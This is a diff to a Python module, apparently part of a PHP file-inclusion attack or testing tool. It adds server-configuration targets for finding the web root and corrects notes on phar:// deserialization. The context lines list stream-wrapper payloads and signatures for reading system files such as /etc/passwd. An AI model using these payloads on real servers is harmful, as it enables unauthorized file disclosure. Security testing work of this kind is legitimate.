@@ -21,6 +21,8 @@ from __future__ import annotations
 
 from dataclasses import dataclass, field
 
+from ...engine.webroot import CONFIG_PATHS
+
 # ------------------------------------------------------------------- targets
 
 # Files worth asking for. A PHP application usually reads its own sources; a
@@ -39,6 +41,12 @@ EXTRA_FILE_TARGETS: tuple[str, ...] = (
     "/var/www/html/index.php",
     "index",
 )
+
+# Files worth reading because they say where the application is served from.
+# A server's configuration is the authority on that - better than any list of
+# guesses - and it is usually readable by the user the application runs as,
+# because that is the user the server writes its own logs as.
+ROOT_DISCLOSURE_TARGETS: tuple[str, ...] = CONFIG_PATHS
 
 # ---------------------------------------------------------------- signatures
 
@@ -197,9 +205,10 @@ PHP_ARCHIVE: tuple[Wrapper, ...] = (
     Wrapper("zip", "zip://{upload}#index.php", family="php-archive", signatures=("<?php",), needs="upload",
             note="zip:// reads inside an archive the target already has"),
     Wrapper("phar", "phar://{upload}/index.php", family="php-archive", signatures=("<?php",), needs="upload",
-            note="phar:// also deserializes metadata, which is the real reason to try it"),
+            note="phar:// reads a file inside the archive. It does not by itself deserialize the "
+                 "metadata: on PHP 8 that happens when the application asks for it"),
     Wrapper("phar-stub", "phar://{upload}", family="php-archive", signatures=(), needs="upload",
-            note="a phar with no inner path, which triggers metadata deserialization on its own"),
+            note="the archive with no inner path, for an application whose own code opens it"),
     Wrapper("compress-zlib", "compress.zlib://{file}", family="php-archive", signatures=("<?php", "root:x:0:0")),
     Wrapper("compress-bzip2", "compress.bzip2://{file}", family="php-archive", signatures=("<?php", "root:x:0:0")),
     Wrapper("glob", "glob:///etc/passwd*", family="php-archive", signatures=("passwd",),
